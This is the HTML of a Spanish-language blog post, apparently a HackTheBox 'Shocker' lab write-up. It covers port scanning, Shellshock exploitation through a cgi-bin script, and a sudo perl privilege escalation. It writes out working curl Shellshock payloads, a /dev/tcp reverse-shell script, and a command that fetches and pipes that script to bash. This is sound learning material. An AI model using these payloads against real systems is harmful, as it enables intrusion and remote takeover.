@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Shocker</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Shocker | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Shocker" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil, nos dará un shock (?) al encontrarnos la vulnerabilidad Shellshock (muy linda) y lograr ejecutar comandos en el sistema. Después jugando con los permisos de usuario podremos obtener una sesión como root explotando el binario Perl." />
+<meta property="og:description" content="Máquina Linux nivel fácil, nos dará un shock (?) al encontrarnos la vulnerabilidad Shellshock (muy linda) y lograr ejecutar comandos en el sistema. Después jugando con los permisos de usuario podremos obtener una sesión como root explotando el binario Perl." />
+<link rel="canonical" href="http://localhost:4000/htb/shocker" />
+<meta property="og:url" content="http://localhost:4000/htb/shocker" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-22T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108banner.png" />
+<meta property="twitter:title" content="HackTheBox - Shocker" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-04-22T00:00:00-07:00","datePublished":"2021-04-22T00:00:00-07:00","description":"Máquina Linux nivel fácil, nos dará un shock (?) al encontrarnos la vulnerabilidad Shellshock (muy linda) y lograr ejecutar comandos en el sistema. Después jugando con los permisos de usuario podremos obtener una sesión como root explotando el binario Perl.","headline":"HackTheBox - Shocker","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/shocker"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/shocker"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Shocker</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-04-22">22 Apr 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108banner.png" alt="HackTheBox - Shocker">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil, nos dará un <strong>shock</strong> (?) al encontrarnos la vulnerabilidad <strong>Shellshock</strong> (muy linda) y lograr ejecutar comandos en el sistema. Después jugando con los permisos de usuario podremos obtener una sesión como <strong>root</strong> explotando el binario <strong>Perl</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108shockerHTB.png" alt="108shockerHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/2984">mrb3n</a>.</p>
+
+<p>HOLAAAAAAAAAAAA e.e</p>
+
+<p>Bueno, será una ruta sencilla y acogedora :3 Nos encontraremos un servicio web el cual tiene el directorio <code>cgi-bin</code> y dentro un archivo <code>user.sh</code>, indagando veremos que podemos relacionar lo encontrado con una vulnerabilidad llamada <strong>Shellshock</strong>, jugando con ella lograremos ejecutar comandos en el sistema como el usuario <strong>shelly</strong>, lo usaremos para entablarnos una reverse Shell.</p>
+
+<p>Estando dentro y validando los permisos que tenemos como <strong>shelly</strong> ante otros usuarios (<code>sudo -l</code>), veremos que podemos ejecutar el binario <code>/usr/bin/perl</code> como el usuario <strong>root</strong>, con la ayuda del repositorio <a href="https://gtfobins.github.io/">GTFOBins</a> (e internet :P) lograremos obtener una (dos, tres, las que quieras) Shell como <strong>root</strong> en la máquina (:</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>¿Khe vamo hace’? 🤔</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Realizamos nuestro escaneo de puertos para saber que servicios está corriendo la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.56 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: initScan
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ # Nmap 7.80 scan initiated Thu Apr 22 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.56
+   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+   3   │ Host: 10.10.10.56 ()    Status: Up
+   4   │ Host: 10.10.10.56 ()    Ports: 80/open/tcp//http///, 2222/open/tcp//EtherNetIP-1///
+   5   │ # Nmap done at Thu Apr 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 163.27 seconds
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+
+<p>Listos, tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://www.techopedia.com/definition/15709/port-80">HTTP</a></strong></td>
+    </tr>
+    <tr>
+      <td>2222</td>
+      <td style="text-align: left">Por ahora no lo sabemos, pero podemos pensar en que pueda estar relacionado con <strong>SSH</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones, así tenemos profundizamos en cada puerto:</p>
+
+<pre><code class="language-bash">❭ nmap -p80,2222 -sC -sV 10.10.10.56 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: portScan
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ # Nmap 7.80 scan initiated Thu Apr 22 25:25:25 2021 as: nmap -p80,2222 -sC -sV -oN portScan 10.10.10.56
+   2   │ Nmap scan report for 10.10.10.56
+   3   │ Host is up (0.19s latency).
+   4   │ 
+   5   │ PORT     STATE SERVICE VERSION
+   6   │ 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+   7   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
+   8   │ |_http-title: Site doesn't have a title (text/html).
+   9   │ 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+  10   │ | ssh-hostkey: 
+  11   │ |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+  12   │ |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+  13   │ |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+  14   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  15   │ 
+  16   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  17   │ # Nmap done at Thu Apr 22 25:25:25 2021 -- 1 IP address (1 host up) scanned in 17.76 seconds
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.18</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">2222</td>
+      <td style="text-align: left"><a href="https://blog.desdelinux.net/configurar-ssh-por-otro-puerto-y-no-por-el-22/">SSH</a></td>
+      <td style="text-align: left">(Confirmamos) OpenSSH 7.2p2</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>¡Listo, a darle pues!</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108page80.png" alt="108page80" /></p>
+
+<p>Jmm, nada interesante, validando el código fuente tampoco vemos nada, hagamos fuzzing a ver si hay algo escondido a la vista:</p>
+
+<pre><code class="language-bash">❭ dirsearch.py -u http://10.10.10.56/ -q
+403 -  297B  - http://10.10.10.56/.ht_wsr.txt
+403 -  300B  - http://10.10.10.56/.htaccess.bak1
+403 -  300B  - http://10.10.10.56/.htaccess.orig
+403 -  302B  - http://10.10.10.56/.htaccess.sample
+403 -  300B  - http://10.10.10.56/.htaccess.save
+403 -  298B  - http://10.10.10.56/.htaccessBAK
+403 -  298B  - http://10.10.10.56/.htaccessOLD
+403 -  301B  - http://10.10.10.56/.htaccess_extra 
+403 -  299B  - http://10.10.10.56/.htaccessOLD2
+403 -  300B  - http://10.10.10.56/.htaccess_orig
+403 -  298B  - http://10.10.10.56/.htaccess_sc
+403 -  290B  - http://10.10.10.56/.htm
+403 -  291B  - http://10.10.10.56/.html
+403 -  300B  - http://10.10.10.56/.htpasswd_test
+403 -  296B  - http://10.10.10.56/.htpasswds
+403 -  297B  - http://10.10.10.56/.httr-oauth
+403 -  294B  - http://10.10.10.56/cgi-bin/
+200 -  137B  - http://10.10.10.56/index.html
+403 -  299B  - http://10.10.10.56/server-status
+</code></pre>
+
+<p>Nada relevante a la vista, pero profundizando en lo único que tenemos, vemos el directorio <code>cgi-bin/</code>, entendamos de que se trata:</p>
+
+<blockquote>
+  <p><strong>CGI</strong> (Common Gateway Interface) es un método por el cual un servidor web puede interactuar con programas externos de generación de contenido, a ellos nos referimos comúnmente como programas CGI o scripts CGI. Es el método más común y sencillo de mostrar contenido dinámico en su sitio web. <a href="https://httpd.apache.org/docs/trunk/es/howto/cgi.html">Apache - CGI</a>.</p>
+</blockquote>
+
+<p>Entonces el servidor envía las solicitudes del cliente a un programa externo, el programa en cuestión puede estar escrito en cualquier lenguaje que sea soportado pro el servidor, que por lo general son lenguajes de scripting.</p>
+
+<blockquote>
+  <p>El <strong>CGI</strong> es utilizado comúnmente para contadores, bases de datos, motores de búsqueda, formulários, generadores de email automático, foros de discusión, chats, comercio electrónico, rotadores y mapas de imágenes, juegos en línea y otros. Esta tecnología tiene la ventaja de correr en el servidor cuando el usuario lo solicita por lo que es dependiente del servidor y no de la computadora del usuario. <a href="http://www.maestrosdelweb.com/cgiintro/">CGI Intro</a>.</p>
+</blockquote>
+
+<p>Bien, hablan de scripts y programas alojados por el recurso <code>cgi</code>, así que podemos probar un fuzz sobre el recurso…</p>
+
+<p>Pero no encontramos nada, si recordamos nos hablaban de lenguajes de scripting, entonces podemos probar a crearnos un archivo con extensiones de lenguajes y volver a validar el fuzzeo:</p>
+
+<blockquote>
+  <p><a href="https://www.neoguias.com/como-saber-la-url-de-cgi-bin/">Encontrar URL del cgi-bin</a> (vemos algunos lenguajes para tener en cuenta).</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ cat extensions.txt 
+───────┬──────────────────────────────────────
+       │ File: extensions.txt
+───────┼──────────────────────────────────────
+   1   │ php
+   2   │ sh
+   3   │ bash
+   4   │ cgi
+   5   │ pl
+   6   │ c
+   7   │ ccp
+   8   │ py
+───────┴──────────────────────────────────────
+</code></pre>
+
+<p>Y ahora con <code>wfuzz</code>:</p>
+
+<pre><code class="language-bash">❭ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt -w extensions.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
+</code></pre>
+
+<p>Donde el primer <strong>FUZZ</strong> hace referencia a cada linea del archivo <code>common.txt</code> y el segundo <strong>FUZZ (FUZ2Z)</strong> a cada linea del archivo <code>extensions.txt</code>:</p>
+
+<pre><code class="language-bash">********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
+Total requests: 37264
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+...
+...
+...
+000034130:   200        7 L      17 W       118 Ch      "user - sh"
+</code></pre>
+
+<p>Perfecto, tenemos un archivo llamado <code>user.sh</code>, si lo visitamos desde la web nos lo descarga, su contenido es simplemente:</p>
+
+<pre><code class="language-bash">❭ cat user.sh 
+───────┬─────────────────────────────────────────────────────────────────────
+       │ File: user.sh
+───────┼─────────────────────────────────────────────────────────────────────
+   1   │ Content-Type: text/plain
+   2   │ 
+   3   │ Just an uptime test script
+   4   │ 
+   5   │  12:36:04 up  1:35,  0 users,  load average: 0.00, 0.01, 0.00
+───────┴─────────────────────────────────────────────────────────────────────
+</code></pre>
+
+<p>Jmmm, pero ¿qué podemos hacer con esto? Haciendo una búsqueda sencilla en Google como “<strong>cgi-bin exploit</strong>” obtenemos un montón de respuestas hablando de una vulnerabilidad llamada <strong>Shellshock</strong>, profundizando…</p>
+
+<h4 id="shellshock">Shellshock</h4>
+
+<p>Me gusto esta intro de <a href="https://securityhacklabs.net/articulo/seguridad-web-explotando-shellshock-en-un-servidor-web-usando-metasploit">securityhacklabs</a> para explicar <strong>Apache</strong> y <strong>CGI</strong>, así que me la robo :P</p>
+
+<blockquote>
+  <p>Apache es un servidor web multiplataforma de código abierto desarrollado por la Apache Software Foundation. Es robusto con características tales como alojamiento virtual, esquemas de autenticación, SSL y TLS, mensajes de error personalizados y compatibilidad con múltiples lenguajes de programación. Apache también tiene un módulo llamado mod_cgi que maneja la ejecución de scripts de Common Gateway Interface (CGI). <a href="https://securityhacklabs.net/articulo/seguridad-web-explotando-shellshock-en-un-servidor-web-usando-metasploit">Explotando Shellshock</a>.</p>
+</blockquote>
+
+<p>Shellshock como su nombre nos spoilea, se basa en la Shell (en términos entendibles en la famosa <strong>bash</strong>), un intérprete que esta por lo general en todos los sistemas <strong>*Unix</strong>. Lo que hace la vulnerabilidad es aprovechar las variables de entorno para definir funciones y jugar a agregar comandos así la función ya se haya terminado de procesar :P</p>
+
+<p>Pa leer:</p>
+
+<ul>
+  <li><a href="https://www.welivesecurity.com/la-es/2014/09/26/shellshock-grave-vulnerabilidad-bash/">Shellshock, la grave vulnerabilidad en Bash</a>.</li>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">CVE-2014-6271</a>.</li>
+  <li><a href="https://empresas.blogthinkbig.com/shellshock-como-se-podria-explotar-en/">Shellshock - como explotarla en remoto</a>.</li>
+  <li><a href="https://nikhilh20.medium.com/exploit-bash-shellshock-part-1-ad1636acaf9e">Exploit Bash Shellshock</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Entonces, podemos validar esta vulnerabilidad de manera sencilla mediante <strong>cURL</strong> probando cositas de <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/cgi">esta guía</a>:</p>
+
+<pre><code class="language-bash">❭ curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh
+</code></pre>
+
+<p>Y nos responde:</p>
+
+<pre><code class="language-html">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error or
+misconfiguration and was unable to complete
+your request.&lt;/p&gt;
+&lt;p&gt;Please contact the server administrator at 
+ webmaster@localhost to inform them of the time this error occurred,
+ and the actions you performed just before this error.&lt;/p&gt;
+&lt;p&gt;More information about this error may be available
+in the server error log.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+
+<p>Podríamos pensar que no es vulnerable, pero leyendo más posts encontramos que si le agregamos más definiciones de <code>echo;</code> antes de lo que queremos ejecutar puede llegar a rular (servir):</p>
+
+<ul>
+  <li><a href="https://www.sevenlayers.com/index.php/125-exploiting-shellshock">Exploiting Shellshock (with extra <strong>echo;</strong>)</a>.</li>
+</ul>
+
+<pre><code class="language-bash">❭ curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh
+</code></pre>
+
+<p>Y responde:</p>
+
+<pre><code class="language-bash">VULNERABLE TO SHELLSHOCK
+
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 13:25:00 up  2:23,  0 users,  load average: 0.00, 0.00, 0.00
+</code></pre>
+
+<p>Bien, probablemente tenemos ejecución de comandos, validemos el <code>id</code> del usuario que esté ejecutando el servicio web:</p>
+
+<pre><code class="language-bash">❭ curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://10.10.10.56/cgi-bin/user.sh
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+</code></pre>
+
+<p>Perfectooooooooooooooooooooo 😯, confirmado. Ahora simplemente intentemos entablar una Reverse Shell ;)</p>
+
+<p>Validamos que exista <strong>cURL</strong> en la máquina:</p>
+
+<pre><code class="language-bash">❭ curl -H 'User-Agent: () { :; }; echo; /usr/bin/which curl' http://10.10.10.56/cgi-bin/user.sh
+/usr/bin/curl
+</code></pre>
+
+<p>Nos creamos un archivo que tenga los comandos que queramos ejecutar, para que cuando hagamos la petición desde la máquina a él le pasemos el binario <code>bash</code> al final y así interprete el contenido:</p>
+
+<pre><code class="language-bash">❭ cat rev.sh 
+#!/bin/bash
+
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/4433 0&gt;&amp;1
+</code></pre>
+
+<p>Levantamos un server web:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Y nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Y desde el Shellshock le indicamos:</p>
+
+<pre><code class="language-bash">❭ curl -H 'User-Agent: () { :; }; echo; /usr/bin/curl http://10.10.14.15:8000/rev.sh | /bin/bash' http://10.10.10.56/cgi-bin/user.sh
+</code></pre>
+
+<p>Y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108bash_shellshock_shelly_revsh.png" alt="108bash_shellshock_shelly_revsh" /></p>
+
+<p>Una sesión como <strong>shelly</strong> :) Hagamos tratamiento de la TTY rápidamente (hay varias formas, a mí me gusta de la siguiente), así evitamos perder la consola si damos <strong>CTRL + C</strong> y además podemos movernos cómodamente entre comandos:</p>
+
+<ol>
+  <li>En la Shell escribimos: <code>script /dev/null -c bash</code>.</li>
+  <li>Ahora hacemos <code>CTRL + Z</code>, lo que enviara la Shell a un estado “en pausa” por así decirlo y nos llevara a nuestra terminal normalita.</li>
+  <li>Escribimos: <code>stty raw -echo; fg</code>.</li>
+  <li>Escribimos: <code>reset</code>.</li>
+  <li>Escribimos: <code>xterm</code>.</li>
+  <li><strong>Ya tendríamos nuestra Shell interactiva, pero arreglemos unos valores y el tamaño de la terminal:</strong></li>
+  <li>Escribimos: <code>export TERM=xterm</code>.</li>
+  <li>Escribimos: <code>export SHELL=bash</code>.</li>
+  <li>Abrimos una nueva terminal de tamaño completo y escribimos <code>stty -a</code>, tomamos esos valores y en la Shell de la máquina escribimos: <code>stty rows &lt;rows&gt; columns &lt;columns&gt;</code>, validamos que el tamaño esté bien ejecutando <code>nano</code>. (Podrías validar el <code>nano</code> también antes de hacer esto, así vez el cambio).</li>
+</ol>
+
+<p>Sigamos…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Si vemos que <a href="https://unix.stackexchange.com/questions/596542/what-is-the-use-of-sudo-l-command">permisos</a> tiene <strong>shelly</strong> para ejecutar comandos en el sistema como otros usuarios encontramos:</p>
+
+<pre><code class="language-bash">shelly@Shocker:/home/shelly$ sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+</code></pre>
+
+<p>Puede ejecutar el binario <code>/usr/bin/perl</code> como el usuario <strong>root</strong> sin necesidad de ingresar contraseña, esto mediante <a href="https://www.linuxtotal.com.mx/index.php?cont=info_admon_014">sudo</a>.</p>
+
+<p>Si vamos al <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">repo (GTFOBins)</a> que tiene un montoooooooon de info sobre como explotar vaaarios binarios, nos encontramos con:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108google_gtfobins_sudoPerl.png" alt="108google_gtfobins_sudoPerl" /></p>
+
+<p>Bien, sencillamente pasándole esa instrucción deberíamos obtener una Shell como el usuario (en este caso) <strong>root</strong>, probemos:</p>
+
+<pre><code class="language-bash">shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108bash_exploit_sudoPerl_rootSH.png" alt="108bash_exploit_sudoPerl_rootSH" /></p>
+
+<p>Perfectoooo, ya seriamos <strong>root</strong> y podríamos hacer lo que quisiéramos</p>
+
+<p><strong>(Claramente puedes jugar con <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl">reverse shells</a> de</strong> perl <strong>y demás cositas para entablar una sesión como</strong> root <strong>, es cuestión de jugar y no quedarse solo con una opción.)</strong></p>
+
+<p>Solo nos quedaría ver las flags…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shocker/108flags.png" alt="108flags" /></p>
+
+<p>…</p>
+
+<p>Super interesante la vulnerabilidad del <strong>Shellshock</strong>, ya siempre que encontremos un directorio <code>cgi-bin/</code> sabemos que debemos buscar posiblemente algo relacionado con ella y además aprendimos que puede parecer que ha fallado, pero simplemente deberíamos agregarle la sentencia <code>echo;</code> e ir probando :P</p>
+
+<p>Y weno, como siempre muchísimas gracias por pasarse yyyyyyyyyyyyy a seguir rompiendo todo!! ❤️</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Shocker&url=http://localhost:4000/htb/shocker" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
